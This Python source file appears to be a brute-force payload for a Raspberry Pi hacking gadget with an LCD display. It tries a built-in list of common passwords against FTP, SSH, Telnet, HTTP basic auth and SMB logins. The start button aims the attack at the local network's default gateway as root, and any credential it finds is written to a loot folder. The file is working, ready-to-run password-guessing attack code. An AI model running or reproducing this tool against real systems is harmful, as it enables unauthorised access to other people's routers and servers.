#!/usr/bin/env python3
"""
Ragnar Brute-Force Module
==========================
Brute-force attack module for Ragnar.
Supports: FTP, SSH, SMB, Telnet, HTTP

Features:
  - Service selection
  - Built-in wordlists (top passwords)
  - Progress display on LCD
  - Auto-stop on found credential
  - Save credentials to loot
"""

import os
import sys
import time
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Custom exception for exiting back to menu
class ExitToMenu(Exception):
    """Raised when user wants to exit back to Ragnar main menu."""
    pass

# Try multiple possible RaspyJack installation paths
possible_roots = [
    os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")),
    "/root/Raspyjack",
    "/home/pi/Raspyjack",
    "/opt/Raspyjack",
]
for root in possible_roots:
    if root not in sys.path and os.path.isdir(root):
        sys.path.insert(0, root)

try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    from payloads._input_helper import get_button
    HAS_LCD = True
except ImportError:
    HAS_LCD = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
W, H = 128, 128

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# Services and their default ports
SERVICES = {
    "FTP": {"port": 21, "default_user": "anonymous"},
    "SSH": {"port": 22, "default_user": "root"},
    "TELNET": {"port": 23, "default_user": "admin"},
    "HTTP": {"port": 80, "default_user": "admin"},
    "SMB": {"port": 445, "default_user": "administrator"},
}

# Small built-in wordlist (top 20 passwords)
DEFAULT_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwerty123456",
]

# Loot directory
LOOT_DIR = Path("/root/Raspyjack/loot/Ragnar/")
LOOT_DIR.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
GREEN = "#00FF00"
RED = "#FF0000"
YELLOW = "#FFFF00"
CYAN = "#00FFFF"
WHITE = "#FFFFFF"
BLACK = "#000000"
GRAY = "#808080"

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
state = {
    "attacking": False,
    "service": None,
    "service_index": 0,
    "target": "",
    "username": "root",
    "password": "",
    "found_creds": [],
    "attempts": 0,
    "total_attempts": 0,
    "progress": 0,
    "current_wordlist": [],
    "wordlist_index": 0,
    "stop_attack": False,
    "frame_index": 0,
}

# ---------------------------------------------------------------------------
# Helper Functions
# ---------------------------------------------------------------------------
def get_local_ip():
    """Get the local IP address of this device."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "10.0.0.1"  # Default fallback

def get_default_gateway():
    """Get the default gateway IP (likely the router)."""
    try:
        import subprocess
        result = subprocess.run(["ip", "route", "show", "default"], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            parts = result.stdout.split()
            if "via" in parts:
                idx = parts.index("via")
                return parts[idx + 1]
    except Exception:
        pass
    return "10.0.0.1"  # Default

# ---------------------------------------------------------------------------
# Animation frames
# ---------------------------------------------------------------------------
SPINNER_FRAMES = ["|", "/", "-", "\\"]
IMAGES_DIR = os.path.join(os.path.dirname(__file__), "images")
IDLE_FRAMES = []
BRUTE_FRAMES = []

def get_animation_frames():
    """Return the appropriate animation frames based on current state."""
    if state.get("attacking"):
        return BRUTE_FRAMES if BRUTE_FRAMES else IDLE_FRAMES
    else:
        return IDLE_FRAMES

def load_images():
    """Load Ragnar sprite images if available."""
    global IDLE_FRAMES, BRUTE_FRAMES
    
    print("[DEBUG] Loading images...")
    
    try:
        from PIL import Image
        
        possible_dirs = [
            "/root/Raspyjack/loot/Ragnar/images",
            os.path.join(os.path.dirname(__file__), "images"),
        ]
        
        print(f"[DEBUG] Checking dirs: {possible_dirs}")
        
        def process_image(fpath):
            """Load image and convert for display."""
            img = Image.open(fpath)
            # Convert to RGB for display
            if img.mode == 'RGBA':
                # Create white background
                background = Image.new('RGB', img.size, (0, 0, 0))
                # Composite using alpha as mask
                background.paste(img, mask=img.split()[3])
                return background.convert('RGB')
            return img.convert('RGB')
        
        # Load IDLE frames
        for img_dir in possible_dirs:
            print(f"[DEBUG] Checking IDLE: {img_dir}/IDLE")
            idle_dir = os.path.join(img_dir, "IDLE")
            if os.path.isdir(idle_dir):
                print(f"[DEBUG] Found IDLE dir: {idle_dir}")
                for ext in ["", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
                    fname = f"IDLE{ext}.bmp" if ext else "IDLE.bmp"
                    fpath = os.path.join(idle_dir, fname)
                    if os.path.exists(fpath):
                        print(f"[DEBUG] Loading: {fpath}")
                        IDLE_FRAMES.append(process_image(fpath))
                if IDLE_FRAMES:
                    print(f"[DEBUG] Loaded {len(IDLE_FRAMES)} IDLE frames")
                    break
        
        # Load FTPBruteforce frames (for brute force)
        for img_dir in possible_dirs:
            print(f"[DEBUG] Checking BRUTE: {img_dir}/FTPBruteforce")
            brute_dir = os.path.join(img_dir, "FTPBruteforce")
            if os.path.isdir(brute_dir):
                print(f"[DEBUG] Found BRUTE dir: {brute_dir}")
                for ext in ["", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
                    fname = f"FTPBruteforce{ext}.bmp" if ext else "FTPBruteforce.bmp"
                    fpath = os.path.join(brute_dir, fname)
                    if os.path.exists(fpath):
                        print(f"[DEBUG] Loading: {fpath}")
                        BRUTE_FRAMES.append(process_image(fpath))
                if BRUTE_FRAMES:
                    print(f"[DEBUG] Loaded {len(BRUTE_FRAMES)} BRUTE frames")
                    break
        
        print(f"[INFO] Loaded {len(IDLE_FRAMES)} IDLE, {len(BRUTE_FRAMES)} BRUTE frames")
    except Exception as e:
        print(f"[WARN] Could not load images: {e}")

# Try to load images on import
load_images()

# ---------------------------------------------------------------------------
# Fallback Animation (when no images loaded)
# ---------------------------------------------------------------------------
VIKING_SPRITE = [
    "  ████  ",
    " ██──██ ",
    "████████",
    "████████",
    " ██▓▓██ ",
    "  ████  ",
    "   ██   ",
    "  █  █  ",
]

def draw_viking_fallback(x, y, size=4, color=GREEN):
    """Draw a simple Viking warrior sprite as fallback."""
    frame = state.get("frame_index", 0)
    anim_offset = [0, 1, 0, -1][frame % 4]
    for row_idx, row in enumerate(VIKING_SPRITE):
        for col_idx, pixel in enumerate(row):
            if pixel in "█▓":
                px = x + (col_idx * size) + (anim_offset if row_idx == 7 else 0)
                py = y + (row_idx * size)
                fill = color if pixel == "█" else YELLOW
                draw.rectangle((px, py, px + size - 1, py + size - 1), fill=fill)

# ---------------------------------------------------------------------------
# GPIO Setup
# ---------------------------------------------------------------------------
if HAS_LCD:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    
    font_small = ImageFont.load_default()
    font_tiny = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 8)
    
    canvas = Image.new("RGB", (W, H), BLACK)
    draw = ImageDraw.Draw(canvas)

# ---------------------------------------------------------------------------
# Attack Functions
# ---------------------------------------------------------------------------
def load_wordlist(wordlist_file=None):
    """Load password list."""
    passwords = []
    
    if wordlist_file and os.path.exists(wordlist_file):
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        # Use default small wordlist
        passwords = DEFAULT_PASSWORDS
    
    return passwords

def try_ftp(target, username, password):
    """Try FTP login."""
    try:
        import ftplib
        ftp = ftplib.FTP(target, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False

def try_ssh(target, username, password):
    """Try SSH login via paramiko or subprocess."""
    try:
        # Use sshpass if available
        result = subprocess.run(
            ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=3", f"{username}@{target}", "echo", "connected"],
            capture_output=True, timeout=5
        )
        return result.returncode == 0
    except Exception:
        return False

def try_telnet(target, username, password):
    """Try Telnet login."""
    try:
        import telnetlib
        tn = telnetlib.Telnet(target, timeout=5)
        tn.read_until(b"login: ")
        tn.write(f"{username}\n".encode())
        tn.read_until(b"Password: ")
        tn.write(f"{password}\n".encode())
        result = tn.read_some()
        tn.quit()
        return b"Login" not in result or b"$" in result
    except Exception:
        return False

def try_http(target, username, password):
    """Try HTTP basic auth."""
    try:
        import requests
        auth = requests.auth.HTTPBasicAuth(username, password)
        resp = requests.get(f"http://{target}", auth=auth, timeout=5)
        return resp.status_code == 200
    except Exception:
        return False

def try_smb(target, username, password):
    """Try SMB login via smbclient or enum4linux."""
    try:
        result = subprocess.run(
            ["smbclient", f"//{target}/IPC$", "-U", f"{username}%{password}",
             "-c", "exit"],
            capture_output=True, timeout=5
        )
        return result.returncode == 0
    except Exception:
        return False

def try_login(service, target, username, password):
    """Try login based on service type."""
    if service == "FTP":
        return try_ftp(target, username, password)
    elif service == "SSH":
        return try_ssh(target, username, password)
    elif service == "TELNET":
        return try_telnet(target, username, password)
    elif service == "HTTP":
        return try_http(target, username, password)
    elif service == "SMB":
        return try_smb(target, username, password)
    return False

def attack_worker():
    """Run brute-force attack in background."""
    state["attacking"] = True
    state["stop_attack"] = False
    
    service = state["service"]
    target = state["target"]
    username = state["username"]
    passwords = state["current_wordlist"]
    
    print(f"[ATTACK] Starting brute force on {target} user:{username} service:{service}")
    
    total = len(passwords)
    
    for i, password in enumerate(passwords):
        if state["stop_attack"]:
            print("[ATTACK] Stopped by user")
            break
        
        state["password"] = password
        state["attempts"] = i + 1
        state["wordlist_index"] = i
        state["progress"] = int((i / total) * 100)
        
        print(f"[ATTACK] Trying {password}...")
        
        if try_login(service, target, username, password):
            # Found credentials!
            print(f"[ATTACK] FOUND: {username}:{password}")
            cred = {
                "service": service,
                "target": target,
                "username": username,
                "password": password,
                "timestamp": datetime.now().isoformat()
            }
            state["found_creds"].append(cred)
            save_cred(cred)
            break
        
        # Small delay between attempts (make it slower to see animation)
        time.sleep(1)
    
    state["attacking"] = False
    print("[ATTACK] Finished")

def save_cred(cred):
    """Save found credentials to loot."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    creds_file = LOOT_DIR / f"creds_{timestamp}.txt"
    
    with open(creds_file, "w") as f:
        f.write(f"Ragnar Brute-Force Results\n")
        f.write(f"========================\n")
        f.write(f"Service: {cred['service']}\n")
        f.write(f"Target: {cred['target']}\n")
        f.write(f"Username: {cred['username']}\n")
        f.write(f"Password: {cred['password']}\n")
        f.write(f"Time: {cred['timestamp']}\n")

# ---------------------------------------------------------------------------
# LCD Display Functions
# ---------------------------------------------------------------------------
if HAS_LCD:
    def draw_view():
        """Draw the attack view."""
        draw.rectangle((0, 0, W, H), fill=BLACK)
        
        # Status bar
        draw.rectangle((0, 0, W, 12), fill=RED)
        draw.text((2, 2), "BRUTE", font=font_tiny, fill=BLACK)
        
        # Attack status with spinner
        if state["attacking"]:
            spinner = SPINNER_FRAMES[state["frame_index"] % len(SPINNER_FRAMES)]
            draw.text((W - 12, 2), spinner, font=font_tiny, fill=BLACK)
        
        # Always update frame index
        state["frame_index"] += 1
        
        # Try to draw animation sprite (center, smaller)
        frames = get_animation_frames()
        if frames:
            frame = frames[state["frame_index"] % len(frames)]
            # Resize to fit nicely on LCD
            frame_resized = frame.resize((48, 48), Image.LANCZOS)
            # If RGBA, convert to RGB with black background
            if frame_resized.mode == 'RGBA':
                bg = Image.new('RGB', frame_resized.size, (0, 0, 0))
                bg.paste(frame_resized, mask=frame_resized.split()[3])
                frame_resized = bg
            else:
                # Convert white to transparent
                frame_resized = frame_resized.convert('RGBA')
                data = frame_resized.getdata()
                new_data = []
                for item in data:
                    # Make white transparent
                    if item[0] > 200 and item[1] > 200 and item[2] > 200:
                        new_data.append((0, 0, 0, 0))
                    else:
                        new_data.append(item)
                frame_resized.putdata(new_data)
                # Composite onto black
                bg = Image.new('RGB', frame_resized.size, (0, 0, 0))
                bg.paste(frame_resized, mask=frame_resized.split()[3])
                frame_resized = bg
            canvas.paste(frame_resized, (40, 14))
        else:
            # Fallback: draw animated Viking head
            draw_viking_fallback(40, 14)
        
        # Target info
        y = 66
        if state["target"]:
            draw.text((2, y), f"Tgt: {state['target'][:14]}", font=font_tiny, fill=WHITE)
        else:
            draw.text((2, y), "No target", font=font_tiny, fill=GRAY)
        
        # Service
        y = 78
        draw.text((2, y), f"Svc: {state['service'] or 'None'}", font=font_tiny, fill=CYAN)
        
        # Progress
        y = 90
        draw.text((2, y), f"{state['attempts']}/{len(state['current_wordlist'])}", font=font_tiny, fill=GREEN)
        
        # Current password on right side
        if state.get("password"):
            pwd = state["password"][:10]
            draw.text((60, y), pwd, font=font_tiny, fill=YELLOW)
        
        # Progress bar
        y = 104
        progress = min(state["progress"] / 100.0, 1.0)
        bar_width = int((W - 4) * progress)
        draw.rectangle((2, y, W - 2, y + 6), outline=GRAY)
        if bar_width > 0:
            draw.rectangle((3, y + 1, 3 + bar_width, y + 5), fill=GREEN)
        
        # Controls
        draw.text((2, H - 10), "L/R:Svc K1:Start K3:Menu", font=font_tiny, fill=GRAY)
        
        LCD.LCD_ShowImage(canvas, 0, 0)

# ---------------------------------------------------------------------------
# Main Attack Loop
# ---------------------------------------------------------------------------
def main():
    """Main attack loop."""
    if not HAS_LCD:
        print("LCD not available, running in headless mode")
        return
    
    # Initialize GPIO
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    
    # Load default wordlist
    state["current_wordlist"] = DEFAULT_PASSWORDS
    state["total_attempts"] = len(DEFAULT_PASSWORDS)
    
    running = True
    
    while running:
        # Poll buttons - don't block
        button = get_button(PINS, GPIO)
        
        if button is not None:
            # Wait for button release
            while get_button(PINS, GPIO) is not None:
                time.sleep(0.05)
            time.sleep(0.15)  # Debounce
            
            if button == "KEY3":
                raise ExitToMenu("Returning to menu")
            
            elif button == "LEFT":
                # Previous service
                service_list = list(SERVICES.keys())
                state["service_index"] = (state["service_index"] - 1) % len(service_list)
                state["service"] = service_list[state["service_index"]]
            
            elif button == "RIGHT":
                # Next service
                service_list = list(SERVICES.keys())
                state["service_index"] = (state["service_index"] + 1) % len(service_list)
                state["service"] = service_list[state["service_index"]]
            
            elif button == "KEY1" and not state["attacking"]:
                # Start attack
                state["target"] = get_default_gateway()
                state["service"] = state["service"] or list(SERVICES.keys())[state["service_index"]]
                state["username"] = "root"
                state["attempts"] = 0
                state["found_creds"] = []
                print(f"[INFO] Starting brute force against {state['target']} service:{state['service']}")
                
                # Start attack in background
                thread = threading.Thread(target=attack_worker, daemon=True)
                thread.start()
            
            elif button == "KEY2" and state["attacking"]:
                # Stop attack
                state["stop_attack"] = True
        
        # Slow down animation loop
        draw_view()
        time.sleep(0.3)
    
    GPIO.cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except ExitToMenu:
        print("[INFO] Returning to Ragnar menu...")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if HAS_LCD:
            GPIO.cleanup()
